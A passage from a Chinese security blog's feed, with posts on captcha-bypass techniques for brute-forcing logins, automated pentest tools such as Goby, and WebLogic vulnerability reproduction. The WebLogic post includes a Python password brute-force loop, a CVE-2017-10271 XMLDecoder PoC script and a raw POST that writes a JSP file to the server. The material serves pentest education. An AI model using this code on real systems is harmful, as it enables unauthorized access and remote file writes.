1】测试人员登录并抓取请求包，在不改变验证码的情况下，多次发送请求包，响应包中内容都是“用户名或密码错误”<br>【安全建议】建议针对一次请求生成的验证码只能用一次，用完立即过期。每次生成的验证码不允许跨会话和请求使用。</p></blockquote><p><strong>4.1.2 有条件不刷新</strong><br>有条件不刷新多见于如下情况：登录失败之后，系统会打开一个新页面或者弹出一个新的警告窗口，提示用户登录失败，点击确定后返回登录界面且验证码刷新。这种情况下，只要我们不关闭新窗口或弹窗，配合使用Burpsuite的intruder模块就可以进行暴力破解了。</p><blockquote><p>【测试案例 2】来看下某系统的验证码鉴权流程：</p><p>用户输入账户信息+验证码(刷新页面或手动刷新验证码会从服务器获取验证码，但该验证码缓存于session中)，服务端接收到账户信息+验证后会先校验验证码是否正确，若不正确则，返回反之与数据库做对比，符合则返回，客户端接收服务端的请求，若成功则跳转，返回根据不同的错误码提示相应信息，并重新获取服务端生成的新验证码，重新缓存。</p><p>【问题描述】看完流程可以很容易想到一个问题：验证码此时并不会重置，一切重置验证码的操作都在浏览器，所以在Session不失效的时效内，可以无限重用验证码，这时就可以使用BurpSuite进行暴力破解了，验证码形同虚设。</p></blockquote><h5 id="4-2-验证码前端可获取"><a href="#4-2-验证码前端可获取" class="headerlink" title="4.2 验证码前端可获取"></a>4.2 验证码前端可获取</h5><p>这种情况在早期的一些网站中比较常见，主要是因为程序员在写代码的时候安全意识不足导致的。验证码通常会被他们隐藏在网站的源码中或者高级一点的隐藏在请求的Cookie中，但这两种情况都可以被攻击者轻松绕过。</p><p><strong>4.2.1 验证码隐藏在源码中</strong><br>验证这种情况很简单，我们只需要记住验证码，然后右键打开网站源代码，Ctrl+F搜索，输入刚才的验证码，如果可以成功匹配到，那恭喜你，接下来就可以写工具，提取源码中的验证码并将其放入每次请求的报文中，来进行帐号破解，这里推荐使用python。</p><p><strong>4.2.2 验证码隐藏在Cookie中</strong><br>这种情况，我们可以在提交登录的时候抓包，然后分析一下包中的Cookie字段，看看其中有没有相匹配的验证码，或者是经过了一些简单加密后的验证码。</p><h5 id="4-3-验证码空值绕过"><a href="#4-3-验证码空值绕过" class="headerlink" title="4.3 验证码空值绕过"></a>4.3 验证码空值绕过</h5><p>验证码空值绕过，是在日常的渗透测试中很容易被我们忽略的一点，实际应用中我们可以通过直接删除验证码参数或者Cookie中的一些值来绕过判断，进行暴力破解。</p><h5 id="4-4-验证码易识别"><a href="#4-4-验证码易识别" class="headerlink" title="4.4 验证码易识别"></a>4.4 验证码易识别</h5><p>在平常的漏洞挖掘过程中，如果我们发现登录的验证码非常简单且易于识别，那我们就可以尝试使用自动化工具来进行登录破解了，如PKAV的HTTP Fuzzer。5. 存在无验证码页面经过测试，如果我们发现网站验证码自身并不存在缺陷，那我们接下来就可以尝试寻找一些其他的登录页面或接口来尝试暴力破解。</p><h5 id="5-5隐藏的页面"><a href="#5-5隐藏的页面" class="headerlink" title="5.5隐藏的页面"></a>5.5隐藏的页面</h5><p>这种页面通常是留给测试人员使用的，或者是一些忘记删除的老界面，利用的前提是该界面依旧可用，一般情况下，我们可以通过扫描器来发现这种页面。</p><h5 id="5-6-微信公众号、APP登录页面"><a href="#5-6-微信公众号、APP登录页面" class="headerlink" title="5.6 微信公众号、APP登录页面"></a>5.6 微信公众号、APP登录页面</h5><p>很多网站的web登录页面已经做的相当完善了，但是却在微信公众后的绑定接口或者是APP的登录界面上面栽了跟头，在渗透测试的过程中，一定不要忘了对公众号和APP的测试。</p><h5 id="5-7-其他绕过方法"><a href="#5-7-其他绕过方法" class="headerlink" title="5.7. 其他绕过方法"></a>5.7. 其他绕过方法</h5><p><strong>5.71万能验证码</strong><br>渗透测试的过程中，有时候会出现这种情况，系统存在一个万能验证码，如000000，只要输入万能验证码，就可以无视验证码进行暴力破解。</p><p><strong>5.7.2验证码无效</strong><br>这种情况下，无论我们输入什么数据，验证码都会判断通过，验证码形同虚设，这种情况我只遇到过一次。</p><p><strong>5.7.3验证码数量有限</strong><br>多见于计算类型的验证码，如1+8=？，这种类型的验证码严格意义上来说不能叫做验证码，多刷新几次验证码，我们可能会发现系统中的算数题目只有那么几道，这种情况下只要将验证码全部下载下来，生成一个md5库，然后将前端生成的验证码与本地文件进行对比即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;验证码怎么玩？&lt;br&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://austfish.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="web" scheme="http://austfish.cn/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>初识自动化渗透工具</title>
    <link href="http://austfish.cn/2020/04/28/%E5%88%9D%E8%AF%86%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    <id>http://austfish.cn/2020/04/28/初识自动化渗透工具/</id>
    <published>2020-04-28T03:42:17.000Z</published>
    <updated>2022-02-18T03:34:21.675Z</updated>
    
    <content type="html"><![CDATA[<p>自动化渗透测试，在渗透测试中，安全专业人士在系统和应用中执行蓄意攻击，以确定是否可能获得未经授权的访问权限。<br><a id="more"></a></p><h4 id="0×01-前言"><a href="#0×01-前言" class="headerlink" title="0×01 前言"></a>0×01 前言</h4><p><strong>听说这个技术很厉害！</strong><br>自动化渗透测试，在渗透测试中，安全专业人士在系统和应用中执行蓄意攻击，以确定是否可能获得未经授权的访问权限。</p><p><strong>为什么使用自动化测试？</strong><br>使用这些工具为企业提供了几个关键的好处。首先，当新漏洞出现时，使用频繁扫描提高了检测速度。其次，自动化工具可以广泛测试大量系统中很多已知安全漏洞，而不需要繁琐的手动测试过程。最后，自动化工具减轻了高技能人员繁琐的工作，让他们可以集中精力来协调测试以及运用其专业知识在最重要的地方。</p><p>自动化测试工具也可以是IT合规稽核的关键组成部分。例如，支付卡行业数据安全标准（PCI DSS）要求对卡处理系统定期进行漏洞评估。自动化是满足这一要求的唯一现实途径。但是，需要注意的是，自动化并不是PCI合规的万能办法。该标准承认：“渗透测试通常是高度手动换的过程。虽然可以使用一些自动化工具，但测试人员需要运用他们对系统的知识来渗透到环境中。”</p><h4 id="0×02-Goby"><a href="#0×02-Goby" class="headerlink" title="0×02 Goby"></a>0×02 Goby</h4><p>Goby是一款新的网络安全测试工具，由赵武Zwell（Pangolin、JSky、FOFA作者）打造，它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并快速的从一个验证入口点，切换到横向。我们希望能够输出更具生命力的工具，能够对标黑客的实际能力，帮助企业来有效地理解和应对网络攻击。</p><h5 id="Goby主要特性："><a href="#Goby主要特性：" class="headerlink" title="Goby主要特性："></a>Goby主要特性：</h5><ul><li>实战性：Goby并不关注漏洞库的数量有多么多，而是关注真正用于实际攻击的漏洞数量，以及漏洞的利用深度（最小精准体，打造权威性）； </li><li>体系性：打通渗透前，渗透中，以及渗透后的完整流程完整DOM事件收集，自动化触发。 </li><li>高效性：利用积累的规则库，全自动的实现IT资产攻击面的梳理；效率提升数倍，发包更少速度更快、更精准； </li><li>平台性：发动广泛的安全人员的力量，完善上面提到的所有资源库；包括基于社区的数据共享，插件发布，漏洞共享等； </li><li>艺术性：安全工具原本就比较偏门，我们更多的关注功能而非美观度，所有大部分的安全工具都是其貌不扬；我们希望使用Goby能给大家带来感官上的享受。</li></ul><h6 id="Goby的使用："><a href="#Goby的使用：" class="headerlink" title="Goby的使用："></a>Goby的使用：</h6><p><strong>1. 资产收集</strong>：<br>自动探测当前网络空间存活的IP及解析域名到IP，轻量且快速的分析出端口对应的协议、Mac地址、证书、应用产品、厂商等信息。<br><img src="http://qiniu.austfish.cn/blog/20200427/fsYIh5FVQrUN.png?imageslim" alt="mark"><br>在设置界面开启以下功能，将获取更多资产信息。</p><ul><li>子域名扫描自动爬取子域名，AXFR监测，二级域名字典爆破，关联域名查询。同时支持连接FOFA，扩大数据源。</li><li>网站截图通过截图，快速判断网站系统应用，无须再一一打开。<blockquote><p>注：该功能基于Chrome截图插件实现，需要预安装Chrome浏览器。</p></blockquote></li><li>深度分析发现非标准端口或非标准应用系统资产，进行深入的应用识别。在实战场景中非常有效。</li><li>代理扫描通过socket5代理，快速进入内网，开启内网渗透。</li></ul><blockquote><p>注：支持Pcap及socket两种模式，请根据不同的场合动态切换。<br>pcap模式：支持协议识别和漏洞扫描，不支持端口扫描；<br>socket模式：支持端口扫描协议识别以及漏洞扫描，扫描速度慢。</p></blockquote><p><strong>2. 漏洞利用</strong></p><ul><li>对扫描出来的风险资产进行批量验证，验证成功后，可进行利用，利用成功后，不需要自己搭建服务器，直接进行shell管理。</li></ul><p><img src="http://qiniu.austfish.cn/blog/20200427/B9J9BzagtvjK.png?imageslim" alt="mark"></p><ul><li>支持自定义PoC及弱口令字典，让安全人员自定义属于自己的武器库，增强攻击力。</li></ul><p><img src="http://qiniu.austfish.cn/blog/20200427/CJGnjj30JI8X.png?imageslim" alt="mark"></p><p><strong>3. 生成报告</strong><br>扫描完成后，生成分析报告，并支持PDF、Excel导出，方便本地分析及呈报传阅。 </p><p><img src="http://qiniu.austfish.cn/blog/20200427/t01CUHqgr7pq.png?imageslim" alt="mark"></p><p><strong>4. CS模式</strong><br>远程服务，区分扫描模块及展示模块。<br>CS搭建：开启远端服务，然后配置服务端主机、端口、账户信息。<br><img src="http://qiniu.austfish.cn/blog/20200427/WPpCdACcfFHw.png?imageslim" alt="mark"></p><h4 id="0×03-Seebug护网工具箱"><a href="#0×03-Seebug护网工具箱" class="headerlink" title="0×03 Seebug护网工具箱"></a>0×03 Seebug护网工具箱</h4><p><strong>1. POC管理</strong></p><ul><li>本地 POC</li><li>在线Seebug POC<br>   登陆账号下载</li></ul><p><img src="http://qiniu.austfish.cn/blog/20200427/HreHCKgprve9.png?imageslim" alt="mark"></p><p><strong>2. 漏洞扫描</strong></p><ul><li>输入目标IP</li><li>检测：验证是否有漏洞</li></ul><p><img src="http://qiniu.austfish.cn/blog/20200427/NWi6fp04IYFc.png?imageslim" alt="mark"></p><ul><li>攻击：攻击模式下将会生成一个一句话shell，成功返回shell地址，shell密码为pass</li><li>shell: 设置监听ip和端口，即可连接shell</li></ul><p><img src="http://qiniu.austfish.cn/blog/20200427/IoOgE8AgAAoU.png?imageslim" alt="mark"></p><p><strong>3. 端口扫描</strong></p><ul><li>支持指定ip段扫描</li><li>支持自选端口扫描</li></ul><p><img src="http://qiniu.austfish.cn/blog/20200427/CbajEq6ayFXA.png?imageslim" alt="mark"></p><p><strong>4. 资产扫描</strong></p><ul><li>支持文件读取目标</li><li>支持手动输出目标</li><li>支持zoomeye关键词爬取目标</li></ul><p><img src="http://qiniu.austfish.cn/blog/20200427/qzQvicA2bqkG.png?imageslim" alt="mark"></p><ul><li>支持界面选择线程数</li><li>支持多选POC</li><li>支持多线程扫描</li><li>支持结果过滤/导出</li></ul><p><img src="http://qiniu.austfish.cn/blog/20200427/MIL9uueU3x55.png?imageslim" alt="mark"></p><p><strong>5. 代理/用户设置</strong></p><ul><li>支持代理设置</li><li>支持用户设置</li></ul><p><img src="http://qiniu.austfish.cn/blog/20200427/43BhFNXlY0Cq.png?imageslim" alt="mark"></p><h4 id="0×04-Sec-admin"><a href="#0×04-Sec-admin" class="headerlink" title="0×04 Sec-admin"></a>0×04 Sec-admin</h4><p><strong>分布式资产安全扫描核心管理系统(弱口令扫描，漏洞扫描)</strong><br><img src="http://qiniu.austfish.cn/blog/20200427/nDCKKqlaK8je.png?imageslim" alt="mark"></p><h5 id="1-架构体系"><a href="#1-架构体系" class="headerlink" title="1.架构体系"></a>1.架构体系</h5><ul><li><strong>前端WEB系统</strong> 使用动静分离的方式部署， WEB页面部分使用 Vue + ElementUI 编写，所有的UI都在这个项目中。</li><li><strong>中央控制系统</strong> 使用Python3 + Flask编写，负责录入资产的端口服务发现、任务执行统计、资产管理、数据字典、漏洞插件管理、用户管理、扫描任务下发以及同步等后台实现，添加的IP会立即进行端口服务以及系统探测。</li><li><strong>任务执行系统</strong> 使用Python3编写，负责处理执行下发的扫描任务，并回馈处理结果。 执行系统以进程为执行单位，可在同一台机器部署多个进程服务，支持多节点分布式部署。</li></ul><h5 id="2-功能介绍"><a href="#2-功能介绍" class="headerlink" title="2.功能介绍"></a>2.功能介绍</h5><ul><li>资产管理<ul><li>资产录入</li><li>资产列表</li></ul></li><li>任务计划<ul><li>添加POC脚本</li><li>执行任务</li></ul></li><li>字典<ul><li>弱口令字典编辑</li><li>弱口令用户名字典编辑</li></ul></li><li>插件管理<ul><li>新增插件</li><li>插件列表</li></ul></li><li>用户管理<ul><li>新增用户</li><li>用户列表</li></ul></li></ul><h5 id="3-项目演示"><a href="#3-项目演示" class="headerlink" title="3.项目演示"></a>3.项目演示</h5><p><strong>流程演示视频</strong><br><a href="https://smallcham.github.io/static/video/sec-demo.mp4" target="_blank" rel="noopener">https://smallcham.github.io/static/video/sec-demo.mp4</a></p><h4 id="0×05-自动化渗透总结"><a href="#0×05-自动化渗透总结" class="headerlink" title="0×05 自动化渗透总结"></a>0×05 自动化渗透总结</h4><p><strong>如何设计一款自动化渗透工具呢？</strong></p><ul><li>信息收集<ul><li>资产探测<ul><li>资产识别和探测</li><li>fofa/zoomeye api调用</li><li>资产导入</li></ul></li></ul></li><li>漏洞检测<ul><li>输入：ip/域名、端口</li><li>输出：是否存在漏洞</li></ul></li><li>漏洞利用<ul><li>输入：选择IP、漏洞</li><li>输出：漏洞利用结果</li><li>反弹shell管理</li></ul></li><li>配置管理<ul><li>脚本管理<ul><li>脚本上传</li><li>信息查询</li><li>启用/禁用</li></ul></li></ul></li><li>知识库<ul><li>漏洞信息库</li><li>edb</li><li>poc库</li><li>补丁库</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自动化渗透测试，在渗透测试中，安全专业人士在系统和应用中执行蓄意攻击，以确定是否可能获得未经授权的访问权限。&lt;br&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="安全" scheme="http://austfish.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>weblogic部分漏洞分析（1）</title>
    <link href="http://austfish.cn/2020/03/31/weblogic%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%881%EF%BC%89/"/>
    <id>http://austfish.cn/2020/03/31/weblogic部分漏洞分析（1）/</id>
    <published>2020-03-31T05:53:18.000Z</published>
    <updated>2022-02-18T03:34:21.271Z</updated>
    
    <content type="html"><![CDATA[<p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，<br><a id="more"></a></p><h4 id="0x01-WebLogic简介"><a href="#0x01-WebLogic简介" class="headerlink" title="0x01 WebLogic简介"></a>0x01 WebLogic简介</h4><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 </p><p>WebLogic是美商oracle的主要产品之一，系并购BEA得来。是商业市场上主要的Java（J2EE）应用服务器软件（application server）之一，是世界上第一个成功商业化的J2EE应用服务器, 已推出到12c(12.1.3) 版。而此产品也延伸出WebLogic Portal，WebLogic Integration等企业用的中间件（但当下Oracle主要以Fusion Middleware融合中间件来取代这些WebLogic Server之外的企业包），以及OEPE(Oracle Enterprise Pack for Eclipse)开发工具。（来自百度百科）</p><p>官方文档地址：<a href="http://docs.oracle.com/en/middleware/index.html" target="_blank" rel="noopener">http://docs.oracle.com/en/middleware/index.html</a></p><h4 id="0x02-WebLogic常用版本和历史漏洞"><a href="#0x02-WebLogic常用版本和历史漏洞" class="headerlink" title="0x02 WebLogic常用版本和历史漏洞"></a>0x02 WebLogic常用版本和历史漏洞</h4><h5 id="活跃版本"><a href="#活跃版本" class="headerlink" title="活跃版本"></a>活跃版本</h5><ul><li>Weblogic 10.3.6.0</li><li>Weblogic 12.1.3.0</li><li>Weblogic 12.2.1.1</li><li>Weblogic 12.2.1.2</li><li>Weblogic 12.2.1.3</li></ul><h5 id="历史漏洞梳理"><a href="#历史漏洞梳理" class="headerlink" title="历史漏洞梳理"></a>历史漏洞梳理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#控制台路径泄露</span><br><span class="line">Weakpassword  </span><br><span class="line"></span><br><span class="line">#SSRF：</span><br><span class="line">CVE-2014-4210   </span><br><span class="line"></span><br><span class="line">#JAVA反序列化：</span><br><span class="line">CVE-2015-4852  </span><br><span class="line">CVE-2016-0638  </span><br><span class="line">CVE-2016-3510   </span><br><span class="line">CVE-2017-3248   </span><br><span class="line">CVE-2018-2628 </span><br><span class="line">CVE-2018-2893   </span><br><span class="line"></span><br><span class="line">#任意文件上传</span><br><span class="line">CVE-2018-2894   </span><br><span class="line"></span><br><span class="line">#XMLDecoder反序列化：</span><br><span class="line">CVE-2017-10271 </span><br><span class="line">CVE-2017-3506</span><br></pre></td></tr></table></figure><h4 id="0x03-WebLogic后台路径和爆破"><a href="#0x03-WebLogic后台路径和爆破" class="headerlink" title="0x03 WebLogic后台路径和爆破"></a>0x03 WebLogic后台路径和爆破</h4><h5 id="控制台路径泄露"><a href="#控制台路径泄露" class="headerlink" title="控制台路径泄露"></a>控制台路径泄露</h5><p>包含模块：Weakpassword<br>相关地址：<a href="http://127.0.0.1:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://127.0.0.1:7001/console/login/LoginForm.jsp</a><br><img src="http://qiniu.austfish.cn/blog/20200331/xPHq9QRmbcv3.png?imageslim" alt="mark"></p><h5 id="弱口令突破"><a href="#弱口令突破" class="headerlink" title="弱口令突破"></a>弱口令突破</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def weakPasswd(self):</span><br><span class="line">        &quot;&quot;&quot;weak password&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        pwddict = [&apos;WebLogic&apos;, &apos;weblogic&apos;, &apos;Oracle@123&apos;, &apos;password&apos;, &apos;system&apos;, &apos;Administrator&apos;, &apos;admin&apos;, &apos;security&apos;, &apos;joe&apos;, &apos;wlcsystem&apos;, &apos;wlpisystem&apos;]</span><br><span class="line">        for user in pwddict:</span><br><span class="line">            for pwd in pwddict:</span><br><span class="line">                data = &#123;</span><br><span class="line">                    &apos;j_username&apos;:user,</span><br><span class="line">                    &apos;j_password&apos;:pwd,</span><br><span class="line">                    &apos;j_character_encoding&apos;:&apos;UTF-8&apos;</span><br><span class="line">                &#125;</span><br><span class="line">                req = requests.post(self.url+&apos;:7001/console/j_security_check&apos;, data=data, allow_redirects=False, verify=False)</span><br><span class="line"></span><br><span class="line">                if req.status_code == 302 and &apos;console&apos; in req.text and &apos;LoginForm.jsp&apos; not in req.text:</span><br><span class="line">                    print(&apos;[+] WebLogic username: &apos;+user+&apos;  password: &apos;+pwd)</span><br></pre></td></tr></table></figure><h4 id="0x04-CVE-2017-10271"><a href="#0x04-CVE-2017-10271" class="headerlink" title="0x04 CVE-2017-10271"></a>0x04 CVE-2017-10271</h4><p>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞</p><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>1、初步判断：访问 <a href="http://10.0.36.52:7001/wls-wsat/CoordinatorPortType11，存在下图则说明可能存在漏洞" target="_blank" rel="noopener">http://10.0.36.52:7001/wls-wsat/CoordinatorPortType11，存在下图则说明可能存在漏洞</a></p><p><img src="http://qiniu.austfish.cn/blog/20200331/iMT23YRLcTxn.png?imageslim" alt="mark"></p><p>2、python验证脚本进行测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding:utf-8</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">from sys import argv</span><br><span class="line"> </span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0&apos;,</span><br><span class="line">    &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,</span><br><span class="line">    &apos;Upgrade-Insecure-Requests&apos;: &apos;1&apos;,</span><br><span class="line">    &apos;Content-Type&apos;: &apos;text/xml&apos;</span><br><span class="line">    &#125;</span><br><span class="line">def Webogic_XMLDecoder_poc(url):</span><br><span class="line">    #url=&quot;http://192.168.8.148:7001&quot;</span><br><span class="line">    posturl=url+&apos;/wls-wsat/CoordinatorPortType&apos;</span><br><span class="line">    data = &apos;&apos;&apos;</span><br><span class="line">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">        &lt;soapenv:Header&gt;</span><br><span class="line">            &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">                &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;</span><br><span class="line">                        &lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">                    &lt;/object&gt;</span><br><span class="line">                &lt;/java&gt;</span><br><span class="line">            &lt;/work:WorkContext&gt;</span><br><span class="line">        &lt;/soapenv:Header&gt;</span><br><span class="line">        &lt;soapenv:Body/&gt;</span><br><span class="line">    &lt;/soapenv:Envelope&gt;</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">     </span><br><span class="line">    print url</span><br><span class="line">    try:</span><br><span class="line">        r=requests.post(posturl,data=data,headers=headers,timeout=5)</span><br><span class="line">        geturl=url+&quot;/wls-wsat/test.txt&quot;</span><br><span class="line">        #print geturl</span><br><span class="line">        check_result = requests.get(geturl,headers=headers,timeout=5)</span><br><span class="line">        if &apos;xmldecoder_vul_test&apos; in check_result.text:</span><br><span class="line">            print u&quot;存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"> </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    if len(argv) == 1:</span><br><span class="line">        print &quot;Please input python Webogic_XMLDecoder_poc.py http://xxxx:7001&quot;</span><br><span class="line">        exit(0)</span><br><span class="line">    else:</span><br><span class="line">        url = argv[1]</span><br><span class="line">    Webogic_XMLDecoder_poc(url)</span><br></pre></td></tr></table></figure></p><p><img src="http://qiniu.austfish.cn/blog/20200331/pTyge4bdmcYq.png?imageslim" alt="mark"></p><p>3、构造POST包进行测试，写入text.jsp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1 </span><br><span class="line">Host: your-ip:7001 </span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept: */* </span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) </span><br><span class="line">Connection: close </span><br><span class="line">Content-Type: text/xml </span><br><span class="line">Content-Length: 638 </span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt; &lt;void method=&quot;println&quot;&gt;&lt;string&gt; </span><br><span class="line">&lt;![CDATA[ &lt;% out.print(&quot;test&quot;); %&gt; ]]&gt; </span><br><span class="line">&lt;/string&gt; </span><br><span class="line">&lt;/void&gt; &lt;void method=&quot;close&quot;/&gt; </span><br><span class="line">&lt;/object&gt;&lt;/java&gt;&lt;/java&gt; </span><br><span class="line">&lt;/work:WorkContext&gt; </span><br><span class="line">&lt;/soapenv:Header&gt; </span><br><span class="line">&lt;soapenv:Body/&gt; </span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://qiniu.austfish.cn/blog/20200331/ppSPFqOrLTTK.png?imageslim" alt="mark"></p><p><strong><a href="http://10.0.36.52:7001/bea_wls_internal/test.jsp" target="_blank" rel="noopener">http://10.0.36.52:7001/bea_wls_internal/test.jsp</a></strong><br><img src="http://qiniu.austfish.cn/blog/20200331/lKVOkLszADpV.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，&lt;br&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="漏洞" scheme="http://austfish.cn/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>浅析社会工程学</title>
    <link href="http://austfish.cn/2020/03/26/%E6%B5%85%E6%9E%90%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
    <id>http://austfish.cn/2020/03/26/浅析社会工程学/</id>
    <published>2020-03-26T05:50:07.000Z</published>
    <updated>2022-02-18T03:34:22.138Z</updated>
    
